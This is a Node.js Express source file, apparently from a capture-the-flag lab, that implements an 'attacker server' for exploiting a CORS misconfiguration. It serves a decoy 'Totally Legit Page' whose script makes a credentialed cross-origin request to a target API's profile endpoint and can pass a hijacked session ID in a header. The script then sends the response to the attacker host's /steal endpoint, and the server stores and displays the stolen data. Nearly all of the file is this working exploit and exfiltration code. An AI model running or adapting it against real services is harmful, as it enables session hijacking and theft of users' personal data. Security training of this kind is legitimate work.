/**
 * Attacker's Server
 *
 * This server:
 * 1. Hosts the malicious exploit page
 * 2. Receives exfiltrated data from victims
 */

const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 4014;
const API_TARGET = process.env.API_TARGET || 'http://api:3014';

// Store stolen data
const stolenData = [];

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files (exploit page)
app.use(express.static(path.join(__dirname, 'public')));

// Dynamic exploit page generator
// The exploit page accepts an optional 'cookie' query parameter
// This allows the admin bot to pass the session cookie for cross-origin use
app.get('/exploit.html', (req, res) => {
  const sessionCookie = req.query.cookie || '';

  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Totally Legit Page</title>
</head>
<body>
  <h1>Loading your content...</h1>
  <p>Please wait while we verify your session.</p>

  <script>
    /**
     * CORS Exploitation Script
     *
     * This script makes a cross-origin request to the vulnerable API
     * with credentials included. Because of the CORS misconfiguration:
     *
     * 1. Our Origin (http://attacker-server:4014) is sent
     * 2. API reflects it back in Access-Control-Allow-Origin
     * 3. API sends Access-Control-Allow-Credentials: true
     * 4. Browser allows JavaScript to read the response
     * 5. We steal the victim's sensitive data!
     *
     * For demo purposes, if a session cookie is passed via URL, we'll
     * use that directly in the Cookie header (since cross-origin cookies
     * don't work without HTTPS in modern browsers).
     */

    const TARGET_API = '${API_TARGET}';
    const EXFIL_SERVER = 'http://attacker-server:4014';
    const SESSION_COOKIE = '${sessionCookie}';

    console.log('[EXPLOIT] Starting CORS attack...');
    console.log('[EXPLOIT] Target API:', TARGET_API);
    console.log('[EXPLOIT] Session cookie provided:', SESSION_COOKIE ? 'Yes' : 'No');

    // Build request options
    const fetchOptions = {
      method: 'GET',
      credentials: 'include',  // Include cookies (if browser allows)
      mode: 'cors',
    };

    // If a session ID was provided, we pass it via X-Session-ID header
    // This exploits the API's misconfiguration that accepts session IDs via headers
    // Combined with the CORS misconfiguration, this allows full session hijacking
    if (SESSION_COOKIE) {
      fetchOptions.headers = {
        'X-Session-ID': SESSION_COOKIE
      };
    }

    // Make authenticated cross-origin request
    fetch(TARGET_API + '/api/profile', fetchOptions)
    .then(response => {
      console.log('[EXPLOIT] Response received');
      console.log('[EXPLOIT] Status:', response.status);
      console.log('[EXPLOIT] CORS headers allowed us to read the response!');
      return response.json();
    })
    .then(data => {
      console.log('[EXPLOIT] Stolen data:', data);

      // Exfiltrate to our server
      const exfilUrl = EXFIL_SERVER + '/steal';

      fetch(exfilUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          stolen: data,
          timestamp: new Date().toISOString(),
          victimOrigin: window.location.href
        })
      })
      .then(() => {
        console.log('[EXPLOIT] Data exfiltrated successfully!');
        document.body.innerHTML = '<h1>Thank you!</h1><p>Your session has been verified.</p>';
      })
      .catch(err => {
        console.error('[EXPLOIT] Exfiltration failed:', err);
      });
    })
    .catch(error => {
      console.error('[EXPLOIT] Attack failed:', error);
      console.error('[EXPLOIT] This could mean CORS is properly configured');
    });
  </script>
</body>
</html>
  `);
});

// Endpoint to receive stolen data
app.post('/steal', (req, res) => {
  const data = req.body;

  console.log('');
  console.log('===============================================================');
  console.log('       STOLEN DATA RECEIVED!');
  console.log('===============================================================');
  console.log(JSON.stringify(data, null, 2));
  console.log('===============================================================');

  // Extract flag if present
  if (data.stolen?.profile?.flag) {
    console.log('');
    console.log('FLAG CAPTURED: ' + data.stolen.profile.flag);
    console.log('');
  }

  stolenData.push({
    ...data,
    receivedAt: new Date().toISOString()
  });

  res.json({ success: true, message: 'Data received' });
});

// Alternative GET-based exfiltration (for img/script-based theft)
app.get('/steal', (req, res) => {
  console.log('');
  console.log('===============================================================');
  console.log('       STOLEN DATA (GET)');
  console.log('===============================================================');
  console.log('Query params:', req.query);
  console.log('===============================================================');

  stolenData.push({
    method: 'GET',
    query: req.query,
    receivedAt: new Date().toISOString()
  });

  res.send('OK');
});

// View stolen data
app.get('/stolen', (req, res) => {
  res.json({
    count: stolenData.length,
    data: stolenData
  });
});

// Clear stolen data
app.delete('/stolen', (req, res) => {
  stolenData.length = 0;
  res.json({ message: 'Cleared' });
});

// Info page
app.get('/', (req, res) => {
  res.send(`
    <html>
    <head>
      <title>Attacker Server</title>
      <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .box { background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 5px; }
        a { color: #00ff00; }
      </style>
    </head>
    <body>
      <h1>Attacker Server</h1>

      <div class="box">
        <h3>Exploit Page</h3>
        <p><a href="/exploit.html">/exploit.html</a> - Malicious page for CORS attack</p>
      </div>

      <div class="box">
        <h3>Exfiltration Endpoint</h3>
        <p>POST /steal - Receives stolen data</p>
        <p><a href="/stolen">/stolen</a> - View collected data (${stolenData.length} entries)</p>
      </div>

      <div class="box">
        <h3>Attack Flow</h3>
        <ol>
          <li>Submit http://attacker-server:4014/exploit.html to admin bot</li>
          <li>Admin's browser loads exploit page</li>
          <li>JavaScript fetches /api/profile with credentials</li>
          <li>CORS misconfiguration allows reading response</li>
          <li>Stolen data sent to /steal endpoint</li>
          <li>View at /stolen</li>
        </ol>
      </div>
    </body>
    </html>
  `);
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', service: 'attacker-server' });
});

app.listen(PORT, () => {
  console.log(`[ATTACKER] Server running on port ${PORT}`);
  console.log(`[ATTACKER] Exploit page: http://localhost:${PORT}/exploit.html`);
  console.log(`[ATTACKER] Target API: ${API_TARGET}`);
  console.log(`[ATTACKER] Waiting for stolen data...`);
});
